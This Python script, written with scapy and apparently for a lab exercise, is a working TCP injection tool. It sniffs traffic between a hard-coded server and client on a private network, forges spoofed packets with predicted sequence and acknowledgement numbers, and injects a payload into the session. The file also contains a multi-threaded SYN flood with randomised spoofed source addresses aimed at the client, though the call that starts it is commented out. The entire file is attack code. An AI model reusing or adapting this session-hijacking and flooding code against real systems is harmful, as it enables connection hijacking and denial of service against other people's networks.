"""
TCP packet injector
NOTE: Requires SUPERUSER privileges to run
"""
from random import randint
import threading

from scapy.all import sendp, send, sniff, Raw, RandIP
from scapy.layers.inet import TCP, IP, Ether

SERVER_SOCK = ('192.168.104.100', 9999)
CLIENT_SOCK = ('192.168.104.142', 5000)
INTERFACE = 'enp2s0'
FLOODER_THREADS = 200
thread_running = True


class Injector:
    def __init__(self):
        self.bad_packet = None
        self.client_port = CLIENT_SOCK[1]

    def _inject(self):
        # print('Trying to inject in {}:{}'.format(self.bad_packet[IP].dst, self.bad_packet[TCP].dport))
        sendp(self.bad_packet, verbose=False)

    def predict_and_inject(self, packet):
        if packet[IP].src == SERVER_SOCK[0] and packet[IP].dst == CLIENT_SOCK[0]:
            self._build_bad_packet(packet)
            try:
                self._inject()
            except KeyboardInterrupt as e:
                raise e
            except BaseException as e:
                print('Erro ao enviar pacote: {}'.format(e.message))

    def _build_bad_packet(self, packet):
        if self.client_port != packet[TCP].dport:
            self.client_port = packet[TCP].dport
        evil_payload = '00000018AM_I_EVIL_YES_I_AM'
        self.bad_packet = Ether() / IP() / TCP() / evil_payload
        self.bad_packet[Ether].src = packet[Ether].dst
        self.bad_packet[Ether].dst = packet[Ether].src
        self.bad_packet[IP].src = packet[IP].dst
        self.bad_packet[IP].dst = packet[IP].src
        self.bad_packet[IP].id = packet[IP].id + randint(1, 128)
        self.bad_packet[TCP].sport = packet[TCP].dport
        self.bad_packet[TCP].dport = packet[TCP].sport
        self.bad_packet[TCP].ack = len(Raw(packet)) + packet[TCP].seq
        self.bad_packet[TCP].seq = packet[TCP].ack
        self.bad_packet[TCP].flags = "PA"
        # These values must be recalculated automatically
        del self.bad_packet[IP].len
        del self.bad_packet[IP].chksum
        del self.bad_packet[TCP].chksum

    def syn_flood_client(self):
        global thread_running
        while thread_running:
            packet = IP(src=RandIP('*.*.*.*'), dst=CLIENT_SOCK[0]) / TCP(dport=self.client_port)
            try:
                send(packet, loop=1, inter=0, verbose=False)
            except:
                continue


def spawn_flooders(injector):
    threads = []
    for _ in range(FLOODER_THREADS):
        threads.append(threading.Thread(target=injector.syn_flood_client))
        threads[-1].start()
    return threads


def main():
    global thread_running
    injector = Injector()
    # threads = spawn_flooders(injector)
    try:
        sniff(iface=INTERFACE, filter='tcp and port {}'.format(SERVER_SOCK[1]), prn=injector.predict_and_inject)
    except BaseException as e:
        print('Erro fatal: {}'.format(e.message))
    thread_running = False
    # for t in threads:
    #     print('Joining')
    #     t.join()


if __name__ == '__main__':
    main()
